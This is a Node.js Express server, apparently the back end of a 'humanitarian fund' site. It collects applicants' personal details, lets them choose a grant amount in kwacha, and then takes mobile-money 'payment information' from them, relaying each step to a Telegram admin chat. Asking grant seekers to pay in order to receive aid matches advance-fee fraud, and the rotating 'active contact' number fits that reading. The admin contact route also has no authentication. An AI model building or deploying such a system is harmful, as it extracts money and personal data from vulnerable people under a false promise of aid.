require("dotenv").config();
const express=require("express"),cors=require("cors"),path=require("path"),crypto=require("crypto"),{Pool}=require("pg");
const app=express(),PORT=process.env.PORT||10000;
if(!process.env.DATABASE_URL){console.error("DATABASE_URL is not configured");process.exit(1)}
const pool=new Pool({connectionString:process.env.DATABASE_URL,ssl:process.env.DATABASE_URL.includes("localhost")?false:{rejectUnauthorized:false}});
app.use(cors());app.use(express.json({limit:"200kb"}));app.use(express.static(path.join(__dirname,"public")));

const FUNDS=["ZMW 18,000","ZMW 25,000","ZMW 28,000","ZMW 30,000","ZMW 35,000"];
const METHODS=["MTN","AIRTEL"];
const makeRef=()=>`WHF-${new Date().getFullYear()}-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;

async function tg(method,payload){
  if(!process.env.TELEGRAM_BOT_TOKEN){console.error("Telegram token missing");return false}
  try{
    const r=await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/${method}`,{
      method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)
    });
    const t=await r.text();
    if(!r.ok)console.error("Telegram API:",r.status,t);
    return r.ok;
  }catch(e){console.error("Telegram request:",e.message);return false}
}

async function init(){
 await pool.query(`CREATE TABLE IF NOT EXISTS applications(
 id SERIAL PRIMARY KEY,reference VARCHAR(32) UNIQUE NOT NULL,full_name VARCHAR(160) NOT NULL,
 age INTEGER NOT NULL,phone VARCHAR(40) NOT NULL,country VARCHAR(100) NOT NULL,
 location VARCHAR(160) NOT NULL,occupation VARCHAR(120) NOT NULL,zone VARCHAR(120),
 purpose VARCHAR(80) NOT NULL,participated_before BOOLEAN NOT NULL DEFAULT FALSE,
 requested_fund VARCHAR(30),payment_method VARCHAR(20),status VARCHAR(30) NOT NULL DEFAULT 'PENDING',
 customer_contact_number VARCHAR(40),created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),reviewed_at TIMESTAMPTZ);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS requested_fund VARCHAR(30);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS payment_method VARCHAR(20);
 ALTER TABLE applications ADD COLUMN IF NOT EXISTS customer_contact_number VARCHAR(40);
 CREATE TABLE IF NOT EXISTS payments(
 id SERIAL PRIMARY KEY,application_id INTEGER REFERENCES applications(id) ON DELETE CASCADE,
 method VARCHAR(20) NOT NULL,transaction_reference VARCHAR(120),statement TEXT,
 amount NUMERIC(12,2),status VARCHAR(30) NOT NULL DEFAULT 'PENDING',
 created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),verified_at TIMESTAMPTZ);
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS transaction_reference VARCHAR(120);
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS statement TEXT;
 ALTER TABLE payments ADD COLUMN IF NOT EXISTS verified_at TIMESTAMPTZ;`);
 console.log("Database ready");
}

async function registerWebhook(){
 if(!process.env.TELEGRAM_WEBHOOK_URL)return;
 const p={url:process.env.TELEGRAM_WEBHOOK_URL,allowed_updates:["callback_query","message"]};
 if(process.env.TELEGRAM_WEBHOOK_SECRET)p.secret_token=process.env.TELEGRAM_WEBHOOK_SECRET;
 await tg("setWebhook",p);
 console.log("Telegram webhook registered");
}

app.get("/health",async(_,res)=>{
 try{await pool.query("SELECT 1");res.json({status:"OK",database:"CONNECTED"})}
 catch(e){res.status(500).json({status:"ERROR",database:"NOT CONNECTED"})}
});

app.get("/api/config",(_,res)=>res.json({
 fundingOptions:FUNDS,paymentMethods:METHODS,
 mtnNumber:process.env.MTN_PAYMENT_NUMBER||"",
 airtelNumber:process.env.AIRTEL_PAYMENT_NUMBER||"",
 customerContactNumber:process.env.CUSTOMER_CONTACT_NUMBER||""
}));

app.post("/api/applications",async(req,res)=>{
 try{
  const {full_name,age,phone,country,location,occupation,zone,purpose,participated_before}=req.body;
  if(!full_name||!age||!phone||!country||!location||!occupation||!purpose)
    return res.status(400).json({error:"Complete all required application details."});
  const reference=makeRef();
  const r=await pool.query(`INSERT INTO applications
   (reference,full_name,age,phone,country,location,occupation,zone,purpose,participated_before)
   VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) RETURNING *`,
   [reference,String(full_name).trim(),Number(age),String(phone).trim(),String(country).trim(),
    String(location).trim(),String(occupation).trim(),zone||null,String(purpose).trim(),
    participated_before==="true"||participated_before===true]);
  const a=r.rows[0];

  const sent=await tg("sendMessage",{
    chat_id:process.env.TELEGRAM_ADMIN_CHAT_ID,parse_mode:"HTML",
    text:`🆕 <b>NEW HUMANITARIAN APPLICATION</b>\n\nReference: <b>${a.reference}</b>\nName: ${a.full_name}\nAge: ${a.age}\nPhone: ${a.phone}\nCountry: ${a.country}\nLocation: ${a.location}\nOccupation: ${a.occupation}\nPurpose: ${a.purpose}\n\nStatus: PENDING`,
    reply_markup:{inline_keyboard:[[
      {text:"📋 REVIEW APPLICATION",callback_data:`review:${a.id}`},
      {text:"❌ REJECT",callback_data:`reject:${a.id}`}
    ]]}
  });
  console.log(`Application ${a.reference}: Telegram ${sent?"SENT":"FAILED"}`);
  res.json({success:true,reference:a.reference,status:a.status,telegramSent:sent});
 }catch(e){console.error("APPLICATION ERROR",e);res.status(500).json({error:"Unable to submit application."})}
});

app.post("/api/applications/:reference/funding",async(req,res)=>{
 try{
  const {requested_fund,payment_method}=req.body;
  if(!FUNDS.includes(requested_fund))return res.status(400).json({error:"Invalid funding selection."});
  if(!METHODS.includes(payment_method))return res.status(400).json({error:"Invalid payment method."});
  const r=await pool.query(`UPDATE applications SET requested_fund=$1,payment_method=$2
    WHERE reference=$3 RETURNING *`,[requested_fund,payment_method,req.params.reference]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found."});
  const a=r.rows[0];

  const sent=await tg("sendMessage",{
    chat_id:process.env.TELEGRAM_ADMIN_CHAT_ID,parse_mode:"HTML",
    text:`💰 <b>FUNDING & PAYMENT METHOD SELECTED</b>\n\nReference: <b>${a.reference}</b>\nCustomer: ${a.full_name}\nPhone: ${a.phone}\nRequested funding: <b>${a.requested_fund}</b>\nPayment method: <b>${a.payment_method}</b>\n\nPlease review the application and respond through the admin controls.`,
    reply_markup:{inline_keyboard:[[
      {text:"✅ APPROVE",callback_data:`approve:${a.id}`},
      {text:"❌ REJECT",callback_data:`reject:${a.id}`}
    ],[
      {text:"📞 USE ACTIVE CONTACT",callback_data:`contact:${a.id}`}
    ]]}
  });
  console.log(`Funding selection ${a.reference}: Telegram ${sent?"SENT":"FAILED"}`);
  res.json({success:true,reference:a.reference,requested_fund:a.requested_fund,payment_method:a.payment_method});
 }catch(e){console.error("FUNDING ERROR",e);res.status(500).json({error:"Unable to save selection."})}
});

app.post("/api/payments",async(req,res)=>{
 try{
  const {reference,method,transaction_reference,statement,amount}=req.body;
  if(!reference||!method||!statement)return res.status(400).json({error:"Complete the payment information."});
  if(!METHODS.includes(method))return res.status(400).json({error:"Invalid payment method."});
  const a=await pool.query("SELECT id,full_name,requested_fund FROM applications WHERE reference=$1",[reference]);
  if(!a.rows.length)return res.status(404).json({error:"Application not found."});

  const p=await pool.query(`INSERT INTO payments(application_id,method,transaction_reference,statement,amount)
    VALUES($1,$2,$3,$4,$5) RETURNING id`,
    [a.rows[0].id,method,transaction_reference||null,statement,amount||null]);

  const sent=await tg("sendMessage",{
    chat_id:process.env.TELEGRAM_ADMIN_CHAT_ID,parse_mode:"HTML",
    text:`💳 <b>PAYMENT INFORMATION RECEIVED</b>\n\nApplication: <b>${reference}</b>\nCustomer: ${a.rows[0].full_name}\nRequested funding: ${a.rows[0].requested_fund||"N/A"}\nMethod: ${method}\nTransaction: ${transaction_reference||"N/A"}\nAmount: ${amount||"N/A"}\n\n<b>Statement:</b>\n${String(statement).slice(0,3500)}`,
    reply_markup:{inline_keyboard:[[
      {text:"✅ VERIFY PAYMENT",callback_data:`payverify:${p.rows[0].id}`},
      {text:"❌ REJECT PAYMENT",callback_data:`payreject:${p.rows[0].id}`}
    ]]}
  });
  console.log(`Payment ${p.rows[0].id}: Telegram ${sent?"SENT":"FAILED"}`);
  res.json({success:true,status:"PENDING"});
 }catch(e){console.error("PAYMENT ERROR",e);res.status(500).json({error:"Unable to submit payment information."})}
});

app.get("/api/applications/:reference",async(req,res)=>{
 try{
  const r=await pool.query(`SELECT reference,status,requested_fund,payment_method,customer_contact_number
    FROM applications WHERE reference=$1`,[req.params.reference]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found."});
  res.json(r.rows[0]);
 }catch(e){res.status(500).json({error:"Unable to check status."})}
});

app.post("/api/admin/applications/:id/contact",async(req,res)=>{
 try{
  const {contact_number}=req.body;
  if(!contact_number)return res.status(400).json({error:"Contact number required."});
  const r=await pool.query(`UPDATE applications SET customer_contact_number=$1
    WHERE id=$2 RETURNING reference,customer_contact_number`,[String(contact_number).trim(),req.params.id]);
  if(!r.rows.length)return res.status(404).json({error:"Application not found."});
  res.json(r.rows[0]);
 }catch(e){res.status(500).json({error:"Unable to save contact number."})}
});

app.post("/telegram/webhook",async(req,res)=>{
 try{
  if(process.env.TELEGRAM_WEBHOOK_SECRET &&
    req.get("x-telegram-bot-api-secret-token")!==process.env.TELEGRAM_WEBHOOK_SECRET)
    return res.sendStatus(401);

  const q=req.body.callback_query;
  if(!q)return res.sendStatus(200);
  const [action,id]=String(q.data||"").split(":");

  if(["approve","reject"].includes(action)){
    const status=action==="approve"?"APPROVED":"REJECTED";
    const r=await pool.query(`UPDATE applications SET status=$1,reviewed_at=NOW()
      WHERE id=$2 RETURNING reference,full_name,requested_fund,payment_method`,[status,id]);
    await tg("answerCallbackQuery",{callback_query_id:q.id,text:`Application ${status.toLowerCase()}.`});
    if(r.rows.length){
      await tg("editMessageText",{chat_id:q.message.chat.id,message_id:q.message.message_id,
        parse_mode:"HTML",text:`${status==="APPROVED"?"✅":"❌"} <b>APPLICATION ${status}</b>\n\nReference: <b>${r.rows[0].reference}</b>\nCustomer: ${r.rows[0].full_name}\nRequested funding: ${r.rows[0].requested_fund||"N/A"}\nPayment method: ${r.rows[0].payment_method||"N/A"}`});
    }
  } else if(action==="contact"){
    await tg("answerCallbackQuery",{callback_query_id:q.id,text:"Use the admin contact field/dashboard to assign the active number."});
  } else if(["payverify","payreject"].includes(action)){
    const status=action==="payverify"?"VERIFIED":"REJECTED";
    const r=await pool.query("UPDATE payments SET status=$1,verified_at=NOW() WHERE id=$2 RETURNING application_id",[status,id]);
    await tg("answerCallbackQuery",{callback_query_id:q.id,text:`Payment ${status.toLowerCase()}.`});
    if(r.rows.length)await tg("editMessageText",{chat_id:q.message.chat.id,message_id:q.message.message_id,text:`${status==="VERIFIED"?"✅":"❌"} PAYMENT ${status}`});
  }
  res.sendStatus(200);
 }catch(e){console.error("WEBHOOK ERROR",e);res.sendStatus(500)}
});

app.get("*",(_,res)=>res.sendFile(path.join(__dirname,"public","index.html")));
(async()=>{try{await init();await registerWebhook();app.listen(PORT,()=>console.log(`Server running on ${PORT}`))}catch(e){console.error("STARTUP ERROR",e);process.exit(1)}})();
